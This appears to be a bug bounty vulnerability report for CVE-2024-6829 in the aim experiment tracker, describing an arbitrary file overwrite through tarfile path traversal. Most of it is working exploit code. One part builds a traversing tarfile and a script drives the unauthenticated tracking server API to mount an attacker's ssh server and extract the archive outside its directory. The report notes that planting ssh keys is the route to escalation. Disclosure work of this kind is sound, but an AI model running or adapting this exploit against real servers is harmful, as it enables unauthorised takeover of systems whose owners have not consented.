@@ -1,0 +1,99 @@
+Title: Arbitrary file overwrite through tarfile-extraction in aimhubio/aim
+
+Proof of Concept: 
+Create a malicious tarfile that contains files that are extracted beyond the directory they are in. Something like this would work:
+
+import tarfile
+with tarfile.open("out.tar.gz", 'w:gz') as tar:
+    # Make sure this ssh-key exists before adding it to the archive
+    tar.add("/../../../../../home/user/.ssh/bad")
+
+Set up an external ssh-server that accepts all connections on port 22 without requesting password or key authentication, with the constructed tarfile at /home, and an empty directory at /home/bcp. For testing, I used a docker container running sshdwith overly permissive login-, directory- and file requirements. The point of this is just to have something for sshfs to be able to log in to without providing a password or key, and to be able to read from when mounted.
+Run the following Python-script:
+
+from aim.ext.transport.message_utils import encode_tree, pack_args, ResourceObject
+from aim.sdk.objects.artifact import Artifact
+import base64
+import os
+import pathlib
+import json
+import requests
+import tarfile
+import time
+
+# This should be the IP:port where the tracking server is running.
+TRACKING_SERVER_IP = "x.x.x.x:53800"
+
+# This should be the IP of where the ssh-server is running.
+SSH_BOX_IP = ...
+
+def encode_arguments(obj: object):
+    """
+    This takes a valid python object and encodes it into the format that the aim tracking server
+    uses to encode its arguments for transport. They are decoded back into the standard objects
+    serverside.
+    """
+    return base64.b64encode(pack_args(encode_tree(obj))).decode()
+
+def post(url: str, payload: object):
+    return requests.request("POST", url, headers={"Content-Type": "application/json"}, data=json.dumps(payload))
+
+GET_RESOURCE_URL = "http://{}/tracking/client_1/get-resource".format(TRACKING_SERVER_IP)
+
+# Create a Repo, assign it the handler 'my_resource'
+post(GET_RESOURCE_URL, {
+    "resource_handler": "my_resource",
+    "resource_type": "Repo",
+    "args": encode_arguments({})
+})
+
+READ_INSTRUCTION = "http://{}/tracking/client_1/read-instruction".format(TRACKING_SERVER_IP)
+# Creates a temporary Repo, (connecting to the ssh-box), and mounting a temporary folder
+post(READ_INSTRUCTION, {
+    "resource_handler": "my_resource",
+    "method_name": "from_path",
+    "args": encode_arguments(["ssh://root@{}:/home".format(SSH_BOX_IP), None, True])
+})
+
+# Now, we are ready to find and extract the malicious tarfile.
+# Set the repo path to be /tmp, and construct a path traversal attack
+# with the run hash.
+post(READ_INSTRUCTION, {
+    "resource_handler": "my_resource",
+    "method_name": "path.setter",
+    "args": encode_arguments(["/tmp"])
+})
+
+# The temporary mounth path is constructed by looking at the current time. 
+# Since the server might be slow with its processing, we need to check adjacent
+# seconds to see if we are off by a second or two. 
+timestamp = int(time.time())
+N = 2
+for i in range(-N, N+1, 1):
+    post(READ_INSTRUCTION, {
+        "resource_handler": "my_resource",
+        "method_name": "_restore_run",
+        "args": encode_arguments(["../{}/home/out.tar.gz".format(str(timestamp + i))])
+    })
+
+Impact: 
+This vulnerability makes it possible to write arbitrary data to arbitrary locations on a remote tracking server running aim. The simplest attack vector for escalation would in this case be something like writing a new ssh-key to the target server.
+
+CVE ID: CVE-2024-6829
+Status: (assigned)
+Vulnerability Type: CWE-73: External Control of File Name or Path
+Severity: Critical (9.1)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: High
+Availability: High
+Registry: Pypi
+Affected Version: 3.19.3
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $900
+Fix Bounty: $225
